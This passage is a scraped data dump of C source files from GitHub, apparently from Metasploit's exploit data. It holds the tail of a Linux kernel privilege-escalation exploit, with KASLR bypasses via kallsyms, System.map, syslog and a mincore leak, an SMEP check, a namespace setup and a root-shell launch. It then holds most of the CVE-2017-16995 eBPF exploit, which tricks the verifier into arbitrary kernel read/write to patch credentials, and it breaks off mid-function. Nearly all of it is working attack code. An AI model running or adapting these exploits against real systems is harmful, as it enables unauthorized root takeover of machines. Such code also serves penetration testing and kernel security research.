\"smep\", 4);\n\tif (found != NULL)\n\t\trv += 1;\n\tfound = memmem(&buffer[0], length, \"smap\", 4);\n\tif (found != NULL)\n\t\trv += 2;\n\treturn rv;\n}\n\nvoid check_smep_smap() {\n\tint rv = smap_smep_enabled();\n\tif (rv >= 2) {\n\t\tdprintf(\"[-] SMAP detected, no bypass available\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n#if !ENABLE_SMEP_BYPASS\n\tif (rv >= 1) {\n\t\tdprintf(\"[-] SMEP detected, use ENABLE_SMEP_BYPASS\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n#endif\n}\n\n// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *\n\n#define SYSLOG_ACTION_READ_ALL 3\n#define SYSLOG_ACTION_SIZE_BUFFER 10\n\nbool mmap_syslog(char** buffer, int* size) {\n\t*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);\n\tif (*size == -1) {\n\t\tdprintf(\"[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)\\n\");\n\t\treturn false;\n\t}\n\n\t*size = (*size / getpagesize() + 1) * getpagesize();\n\t*buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,\n\t\t\t\t   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n\t*size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);\n\tif (*size == -1) {\n\t\tdprintf(\"[-] klogctl(SYSLOG_ACTION_READ_ALL)\\n\");\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n\nunsigned long get_kernel_addr_trusty(char* buffer, int size) {\n\tconst char* needle1 = \"Freeing unused\";\n\tchar* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));\n\tif (substr == NULL) return 0;\n\n\tint start = 0;\n\tint end = 0;\n\tfor (end = start; substr[end] != '-'; end++);\n\n\tconst char* needle2 = \"ffffff\";\n\tsubstr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));\n\tif (substr == NULL) return 0;\n\n\tchar* endptr = &substr[16];\n\tunsigned long r = strtoul(&substr[0], &endptr, 16);\n\n\tr &= 0xffffffffff000000ul;\n\n\treturn r;\n}\n\nunsigned long get_kernel_addr_xenial(char* buffer, int size) {\n\tconst char* needle1 = \"Freeing unused\";\n\tchar* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));\n\tif (substr == NULL) {\n\t\treturn 0;\n\t}\n\n\tint start = 0;\n\tint end = 0;\n\tfor (start = 0; substr[start] != '-'; start++);\n\tfor (end = start; substr[end] != '\\n'; end++);\n\n\tconst char* needle2 = \"ffffff\";\n\tsubstr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));\n\tif (substr == NULL) {\n\t\treturn 0;\n\t}\n\n\tchar* endptr = &substr[16];\n\tunsigned long r = strtoul(&substr[0], &endptr, 16);\n\n\tr &= 0xfffffffffff00000ul;\n\tr -= 0x1000000ul;\n\n\treturn r;\n}\n\nunsigned long get_kernel_addr_syslog() {\n\tunsigned long addr = 0;\n\tchar* syslog;\n\tint size;\n\n\tdprintf(\"[.] trying syslog...\\n\");\n\n\tif (!mmap_syslog(&syslog, &size))\n\t\treturn 0;\n\n\tif (strcmp(\"trusty\", kernels[kernel].distro) == 0)\n\t\taddr = get_kernel_addr_trusty(syslog, size);\n\tif (strcmp(\"xenial\", kernels[kernel].distro) == 0)\n\t\taddr = get_kernel_addr_xenial(syslog, size);\n\n\tif (!addr)\n\t\tdprintf(\"[-] kernel base not found in syslog\\n\");\n\n\treturn addr;\n}\n\n// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr_kallsyms() {\n\tFILE *f;\n\tunsigned long addr = 0;\n\tchar dummy;\n\tchar sname[256];\n\tchar* name = \"startup_64\";\n\tchar* path = \"/proc/kallsyms\";\n\n\tdprintf(\"[.] trying %s...\\n\", path);\n\tf = fopen(path, \"r\");\n\tif (f == NULL) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\treturn 0;\n\t}\n\n\tint ret = 0;\n\twhile (ret != EOF) {\n\t\tret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n\t\tif (ret == 0) {\n\t\t\tfscanf(f, \"%s\\n\", sname);\n\t\t\tcontinue;\n\t\t}\n\t\tif (!strcmp(name, sname)) {\n\t\t\tfclose(f);\n\t\t\treturn addr;\n\t\t}\n\t}\n\n\tfclose(f);\n\tdprintf(\"[-] kernel base not found in %s\\n\", path);\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * System.map KASLR bypass * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr_sysmap() {\n\tFILE *f;\n\tunsigned long addr = 0;\n\tchar path[512] = \"/boot/System.map-\";\n\tchar version[32];\n\n\tstruct utsname u;\n\tu = get_kernel_version();\n\tstrcat(path, u.release);\n\tdprintf(\"[.] trying %s...\\n\", path);\n\tf = fopen(path, \"r\");\n\tif (f == NULL) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\treturn 0;\n\t}\n\n\tchar dummy;\n\tchar sname[256];\n\tchar* name = \"startup_64\";\n\tint ret = 0;\n\twhile (ret != EOF) {\n\t\tret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\n\t\tif (ret == 0) {\n\t\t\tfscanf(f, \"%s\\n\", sname);\n\t\t\tcontinue;\n\t\t}\n\t\tif (!strcmp(name, sname)) {\n\t\t\tfclose(f);\n\t\t\treturn addr;\n\t\t}\n\t}\n\n\tfclose(f);\n\tdprintf(\"[-] kernel base not found in %s\\n\", path);\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr_mincore() {\n\tunsigned char buf[getpagesize()/sizeof(unsigned char)];\n\tunsigned long iterations = 20000000;\n\tunsigned long addr = 0;\n\n\tdprintf(\"[.] trying mincore info leak...\\n\");\n\t/* A MAP_ANONYMOUS | MAP_HUGETLB mapping */\n\tif (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,\n\t\tMAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {\n\t\tdprintf(\"[-] mmap()\\n\");\n\t\treturn 0;\n\t}\n\n\tint i;\n\tfor (i = 0; i <= iterations; i++) {\n\t\t/* Touch a mishandle with this type mapping */\n\t\tif (mincore((void*)0x86000000, 0x1000000, buf)) {\n\t\t\tdprintf(\"[-] mincore()\\n\");\n\t\t\treturn 0;\n\t\t}\n\n\t\tint n;\n\t\tfor (n = 0; n < getpagesize()/sizeof(unsigned char); n++) {\n\t\t\taddr = *(unsigned long*)(&buf[n]);\n\t\t\t/* Kernel address space */\n\t\t\tif (addr > 0xffffffff00000000) {\n\t\t\t\taddr &= 0xffffffffff000000ul;\n\t\t\t\tif (munmap((void*)0x66000000, 0x20000000000))\n\t\t\t\t\tdprintf(\"[-] munmap()\\n\");\n\t\t\t\treturn addr;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (munmap((void*)0x66000000, 0x20000000000))\n\t\tdprintf(\"[-] munmap()\\n\");\n\n\tdprintf(\"[-] kernel base not found in mincore info leak\\n\");\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *\n\nunsigned long get_kernel_addr() {\n\tunsigned long addr = 0;\n\n\taddr = get_kernel_addr_kallsyms();\n\tif (addr) return addr;\n\n\taddr = get_kernel_addr_sysmap();\n\tif (addr) return addr;\n\n\taddr = get_kernel_addr_syslog();\n\tif (addr) return addr;\n\n\taddr = get_kernel_addr_mincore();\n\tif (addr) return addr;\n\n\tdprintf(\"[-] KASLR bypass failed\\n\");\n\texit(EXIT_FAILURE);\n\n\treturn 0;\n}\n\n// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *\n\nstatic bool write_file(const char* file, const char* what, ...) {\n\tchar buf[1024];\n\tva_list args;\n\tva_start(args, what);\n\tvsnprintf(buf, sizeof(buf), what, args);\n\tva_end(args);\n\tbuf[sizeof(buf) - 1] = 0;\n\tint len = strlen(buf);\n\n\tint fd = open(file, O_WRONLY | O_CLOEXEC);\n\tif (fd == -1)\n\t\treturn false;\n\tif (write(fd, buf, len) != len) {\n\t\tclose(fd);\n\t\treturn false;\n\t}\n\tclose(fd);\n\treturn true;\n}\n\nvoid setup_sandbox() {\n\tint real_uid = getuid();\n\tint real_gid = getgid();\n\n\tif (unshare(CLONE_NEWUSER) != 0) {\n\t\tdprintf(\"[!] unprivileged user namespaces are not available\\n\");\n\t\tdprintf(\"[-] unshare(CLONE_NEWUSER)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (unshare(CLONE_NEWNET) != 0) {\n\t\tdprintf(\"[-] unshare(CLONE_NEWUSER)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (!write_file(\"/proc/self/setgroups\", \"deny\")) {\n\t\tdprintf(\"[-] write_file(/proc/self/set_groups)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (!write_file(\"/proc/self/uid_map\", \"0 %d 1\\n\", real_uid)) {\n\t\tdprintf(\"[-] write_file(/proc/self/uid_map)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (!write_file(\"/proc/self/gid_map\", \"0 %d 1\\n\", real_gid)) {\n\t\tdprintf(\"[-] write_file(/proc/self/gid_map)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tcpu_set_t my_set;\n\tCPU_ZERO(&my_set);\n\tCPU_SET(0, &my_set);\n\tif (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {\n\t\tdprintf(\"[-] sched_setaffinity()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (system(\"/sbin/ifconfig lo mtu 1500\") != 0) {\n\t\tdprintf(\"[-] system(/sbin/ifconfig lo mtu 1500)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tif (system(\"/sbin/ifconfig lo up\") != 0) {\n\t\tdprintf(\"[-] system(/sbin/ifconfig lo up)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n}\n\nvoid exec_shell() {\n\tint fd;\n\n\tfd = open(\"/proc/1/ns/net\", O_RDONLY);\n\tif (fd == -1) {\n\t\tdprintf(\"error opening /proc/1/ns/net\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (setns(fd, CLONE_NEWNET) == -1) {\n\t\tdprintf(\"error calling setns\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tsystem(SHELL);\n}\n\nbool is_root() {\n\t// We can't simple check uid, since we're running inside a namespace\n\t// with uid set to 0. Try opening /etc/shadow instead.\n\tint fd = open(\"/etc/shadow\", O_RDONLY);\n\tif (fd == -1)\n\t\treturn false;\n\tclose(fd);\n\treturn true;\n}\n\nvoid check_root() {\n\tdprintf(\"[.] checking if we got root\\n\");\n\tif (!is_root()) {\n\t\tdprintf(\"[-] something went wrong =(\\n\");\n\t\treturn;\n\t}\n\tdprintf(\"[+] got r00t ^_^\\n\");\n\texec_shell();\n}\n\nint main(int argc, char** argv) {\n\tif (argc > 1) SHELL = argv[1];\n\n\tdprintf(\"[.] starting\\n\");\n\n\tdprintf(\"[.] checking kernel version\\n\");\n\tdetect_kernel();\n\tdprintf(\"[~] done, version looks good\\n\");\n\n\tdprintf(\"[.] checking SMEP and SMAP\\n\");\n\tcheck_smep_smap();\n\tdprintf(\"[~] done, looks good\\n\");\n\n\tdprintf(\"[.] setting up namespace sandbox\\n\");\n\tsetup_sandbox();\n\tdprintf(\"[~] done, namespace sandbox set up\\n\");\n\n#if ENABLE_KASLR_BYPASS\n\tdprintf(\"[.] KASLR bypass enabled, getting kernel addr\\n\");\n\tKERNEL_BASE = get_kernel_addr();\n\tdprintf(\"[~] done, kernel addr:   %lx\\n\", KERNEL_BASE);\n#endif\n\n\tdprintf(\"[.] commit_creds:        %lx\\n\", COMMIT_CREDS);\n\tdprintf(\"[.] prepare_kernel_cred: %lx\\n\", PREPARE_KERNEL_CRED);\n\n\tunsigned long payload = (unsigned long)&get_root;\n\n#if ENABLE_SMEP_BYPASS\n\tdprintf(\"[.] SMEP bypass enabled, mmapping fake stack\\n\");\n\tmmap_stack();\n\tpayload = XCHG_EAX_ESP_RET;\n\tdprintf(\"[~] done, fake stack mmapped\\n\");\n#endif\n\n\tdprintf(\"[.] executing payload %lx\\n\", payload);\n\toob_execute(payload);\n\tdprintf(\"[~] done, should be root now\\n\");\n\n\tcheck_root();\n\n\treturn 0;\n}\n", "timestamp": "2025-10-24T23:42:03.055381"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2017-16995/exploit.c", "content": "/*\n  Credit @bleidl, this is a slight modification to his original POC\n  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c\n  \n  For details on how the exploit works, please visit\n  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html\n   \n  Tested on Ubuntu 16.04 with the following Kernels\n  4.4.0-31-generic\n  4.4.0-62-generic\n  4.4.0-81-generic\n  4.4.0-116-generic\n  4.8.0-58-generic\n  4.10.0.42-generic\n  4.13.0-21-generic\n\n  Tested on Fedora 27\n  4.13.9-300\n  gcc cve-2017-16995.c -o cve-2017-16995\n  internet@client:~/cve-2017-16995$ ./cve-2017-16995\n  [.]\n  [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)\n  [.]\n  [.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **\n  [.]\n  [*] creating bpf map\n  [*] sneaking evil bpf past the verifier\n  [*] creating socketpair()\n  [*] attaching bpf backdoor to socket\n  [*] skbuff => ffff880038c3f500  \n  [*] Leaking sock struct from ffff88003af5e180\n  [*] Sock->sk_rcvtimeo at offset 472\n  [*] Cred structure at ffff880038704600\n  [*] UID from cred structure: 1000, matches the current: 1000\n  [*] hammering cred structure at ffff880038704600\n  [*] credentials patched, launching shell...\n  #id\n  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(internet)\n  \n*/\n\n#include <errno.h>\n#include <fcntl.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <linux/bpf.h>\n#include <linux/unistd.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/un.h>\n#include <sys/stat.h>\n#include <sys/personality.h>\n\nchar buffer[64];\nint sockets[2];\nint mapfd, progfd;\nint doredact = 0;\n\n#define LOG_BUF_SIZE 65536\n#define PHYS_OFFSET 0xffff880000000000\nchar bpf_log_buf[LOG_BUF_SIZE];\n\nstatic __u64 ptr_to_u64(void *ptr)\n{\n\treturn (__u64) (unsigned long) ptr;\n}\n\nint bpf_prog_load(enum bpf_prog_type prog_type,\n\t\t  const struct bpf_insn *insns, int prog_len,\n\t\t  const char *license, int kern_version)\n{\n\tunion bpf_attr attr = {\n\t\t.prog_type = prog_type,\n\t\t.insns = ptr_to_u64((void *) insns),\n\t\t.insn_cnt = prog_len / sizeof(struct bpf_insn),\n\t\t.license = ptr_to_u64((void *) license),\n\t\t.log_buf = ptr_to_u64(bpf_log_buf),\n\t\t.log_size = LOG_BUF_SIZE,\n\t\t.log_level = 1,\n\t};\n\n\tattr.kern_version = kern_version;\n\n\tbpf_log_buf[0] = 0;\n\n\treturn syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));\n}\n\nint bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,\n\t\t   int max_entries, int map_flags)\n{\n\tunion bpf_attr attr = {\n\t\t.map_type = map_type,\n\t\t.key_size = key_size,\n\t\t.value_size = value_size,\n\t\t.max_entries = max_entries\n\t};\n\n\treturn syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));\n}\n\nint bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)\n{\n\tunion bpf_attr attr = {\n\t\t.map_fd = fd,\n\t\t.key = ptr_to_u64(key),\n\t\t.value = ptr_to_u64(value),\n\t\t.flags = flags,\n\t};\n\n\treturn syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));\n}\n\nint bpf_lookup_elem(int fd, void *key, void *value)\n{\n\tunion bpf_attr attr = {\n\t\t.map_fd = fd,\n\t\t.key = ptr_to_u64(key),\n\t\t.value = ptr_to_u64(value),\n\t};\n\n\treturn syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));\n}\n\n#define BPF_ALU64_IMM(OP, DST, IMM)\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_MOV64_REG(DST, SRC)\t\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ALU64 | BPF_MOV | BPF_X,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = 0 })\n\n#define BPF_MOV32_REG(DST, SRC)\t\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ALU | BPF_MOV | BPF_X,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = 0 })\n\n#define BPF_MOV64_IMM(DST, IMM)\t\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ALU64 | BPF_MOV | BPF_K,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_MOV32_IMM(DST, IMM)\t\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ALU | BPF_MOV | BPF_K,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_LD_IMM64(DST, IMM)\t\t\t\t\t\\\n\tBPF_LD_IMM64_RAW(DST, 0, IMM)\n\n#define BPF_LD_IMM64_RAW(DST, SRC, IMM)\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_LD | BPF_DW | BPF_IMM,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = (__u32) (IMM) }),\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = 0, \t\t\t\t\t\\\n\t\t.dst_reg = 0,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = ((__u64) (IMM)) >> 32 })\n\n#ifndef BPF_PSEUDO_MAP_FD\n# define BPF_PSEUDO_MAP_FD\t1\n#endif\n\n#define BPF_LD_MAP_FD(DST, MAP_FD)\t\t\t\t\\\n\tBPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)\n\n#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = OFF,\t\t\t\t\t\\\n\t\t.imm   = 0 })\n\n#define BPF_STX_MEM(SIZE, DST, SRC, OFF)\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = OFF,\t\t\t\t\t\\\n\t\t.imm   = 0 })\n\n#define BPF_ST_MEM(SIZE, DST, OFF, IMM)\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = OFF,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_JMP_IMM(OP, DST, IMM, OFF)\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_JMP | BPF_OP(OP) | BPF_K,\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = OFF,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = CODE,\t\t\t\t\t\\\n\t\t.dst_reg = DST,\t\t\t\t\t\\\n\t\t.src_reg = SRC,\t\t\t\t\t\\\n\t\t.off   = OFF,\t\t\t\t\t\\\n\t\t.imm   = IMM })\n\n#define BPF_EXIT_INSN()\t\t\t\t\t\t\\\n\t((struct bpf_insn) {\t\t\t\t\t\\\n\t\t.code  = BPF_JMP | BPF_EXIT,\t\t\t\\\n\t\t.dst_reg = 0,\t\t\t\t\t\\\n\t\t.src_reg = 0,\t\t\t\t\t\\\n\t\t.off   = 0,\t\t\t\t\t\\\n\t\t.imm   = 0 })\n\n#define BPF_DISABLE_VERIFIER()                                                       \\\n\tBPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             /* r2 = (u32)0xFFFFFFFF   */   \\\n\tBPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   /* if (r2 == -1) {        */   \\\n\tBPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */   \\\n\tBPF_EXIT_INSN()                                   /* }                      */   \\\n\n#define BPF_MAP_GET(idx, dst)                                                        \\\n\tBPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \\\n\tBPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \\\n\tBPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \\\n\tBPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \\\n\tBPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \\\n\tBPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \\\n\tBPF_EXIT_INSN(),                                  /*   exit(0);             */   \\\n\tBPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */              \n\nstatic int load_prog() {\n\tstruct bpf_insn prog[] = {\n\t\tBPF_DISABLE_VERIFIER(),\n\n\t\tBPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, -16),   /* *(fp - 16) = r1       */\n\n\t\tBPF_LD_MAP_FD(BPF_REG_9, mapfd),\n\n\t\tBPF_MAP_GET(0, BPF_REG_6),                         /* r6 = op               */\n\t\tBPF_MAP_GET(1, BPF_REG_7),                         /* r7 = address          */\n\t\tBPF_MAP_GET(2, BPF_REG_8),                         /* r8 = value            */\n\n\t\t/* store map slot address in r2 */\n\t\tBPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0               */\n\t\tBPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */\n\n\t\tBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),             /* if (op == 0)          */\n\t\t/* get fp */\n\t\tBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),\n\t\tBPF_EXIT_INSN(),\n\n\t\tBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),             /* else if (op == 1)     */\n\t\t/* get skbuff */\n\t\tBPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, -16),\n\t\tBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),\n\t\tBPF_EXIT_INSN(),\n\n\t\tBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 3),             /* else if (op == 2)     */\n\t\t/* read */\n\t\tBPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),\n\t\tBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),\n\t\tBPF_EXIT_INSN(),\n\t\t/* else                  */\n\t\t/* write */\n\t\tBPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), \n\t\tBPF_EXIT_INSN(),\n\n\t};\n\treturn bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog), \"GPL\", 0);\n}\n\nvoid info(const char *fmt, ...) {\n\tva_list args;\n\tva_start(args, fmt);\n\tfprintf(stdout, \"[.] \");\n\tvfprintf(stdout, fmt, args);\n\tva_end(args);\n}\n\nvoid msg(const char *fmt, ...) {\n\tva_list args;\n\tva_start(args, fmt);\n\tfprintf(stdout, \"[*] \");\n\tvfprintf(stdout, fmt, args);\n\tva_end(args);\n}\n\nvoid redact(const char *fmt, ...) {\n\tva_list args;\n\tva_start(args, fmt);\n\tif(doredact) {\n\t\tfprintf(stdout, \"[!] ( ( R E D A C T E D ) )\\n\");\n\t\treturn;\n\t}\n\tfprintf(stdout, \"[*] \");\n\tvfprintf(stdout, fmt, args);\n\tva_end(args);\n}\n\nvoid fail(const char *fmt, ...) {\n\tva_list args;\n\tva_start(args, fmt);\n\tfprintf(stdout, \"[!] \");\n\tvfprintf(stdout, fmt, args);\n\tva_end(args);\n\texit(1);\n}\n\nvoid \ninitialize() {\n\tinfo(\"\\n\");\n\tinfo(\"t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)\\n\");\n\tinfo(\"\\n\");\n\tinfo(\"  ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **\\n\");\n\tinfo(\"\\n\");\n\n\tredact(\"creating bpf map\\n\");\n\tmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);\n\tif (mapfd < 0) {\n\t\tfail(\"failed to create bpf map: '%s'\\n\", strerror(errno));\n\t}\n\n\tredact(\"sneaking evil bpf past the verifier\\n\");\n\tprogfd = load_prog();\n\tif (progfd < 0) {\n\t\tif (errno == EACCES) {\n\t\t\tmsg(\"log:\\n%s\", bpf_log_buf);\n\t\t}\n\t\tfail(\"failed to load prog '%s'\\n\", strerror(errno));\n\t}\n\n\tredact(\"creating socketpair()\\n\");\n\tif(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {\n\t\tfail(\"failed to create socket pair '%s'\\n\", strerror(errno));\n\t}\n\n\tredact(\"attaching bpf backdoor to socket\\n\");\n\tif(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {\n\t\tfail(\"setsockopt '%s'\\n\", strerror(errno));\n\t}\n}\n\nstatic void writemsg() {\n\tssize_t n = write(sockets[0], buffer, sizeof(buffer));\n\tif (n < 0) {\n\t\tperror(\"write\");\n\t\treturn;\n\t}\n\tif (n != sizeof(buffer)) {\n\t\tfprintf(stderr, \"short write: %zd\\n\", n);\n\t}\n}\n\nstatic void \nupdate_elem(int key, unsigned long value) {\n\tif (bpf_update_elem(mapfd, &key, &value, 0)) {\n\t\tfail(\"bpf_update_elem failed '%s'\\n\", strerror(errno));\n\t}\n}\n\nstatic unsigned long \nget_value(int key) {\n\tunsigned long value;\n\tif (bpf_lookup_elem(mapfd, &key, &value)) {\n\t\tfail(\"bpf_lookup_elem failed '%s'\\n\", strerror(errno));\n\t}\n\treturn value;\n}\n\nstatic unsigned long\nsendcmd(unsigned long op, unsigned long addr, unsigned long value) {\n\tupdate_elem(0, op);\n\tupdate_elem(1, addr);\n\tupdate_elem(2, value);\n\twritemsg();\n\treturn get_value(2);\n}\n\nunsigned long\nget_skbuff() {\n\treturn sendcmd(1, 0, 0);\n}\n\nunsigned long\nget_fp() {\n\treturn sendcmd(0, 0, 0);\n}\n\nunsigned long\nread64(unsigned long addr) {\n\treturn sendcmd(2, addr, 0);\n}\n\nvoid\nwrite64(unsigned long addr, unsigned long val) {\n\t(void)sendcmd(3, addr, val);\n}\n\nstatic unsigned long find_cred() {\n\tuid_t uid = getuid();\n\tunsigned long skbuff = get_skbuff();\n\t/*\n\t * struct sk_buff {\n\t *     [...24 byte offset...]\n\t *     struct sock     *sk;\n\t * };\n\t *\n\t */\n\n\tunsigned long sock_addr = read64(skbuff + 24);\n\tmsg(\"skbuff => %llx\\n\", skbuff);\n\tmsg(\"Leaking sock struct from %llx\\n\", sock_addr);\t\n\tif(sock_addr < 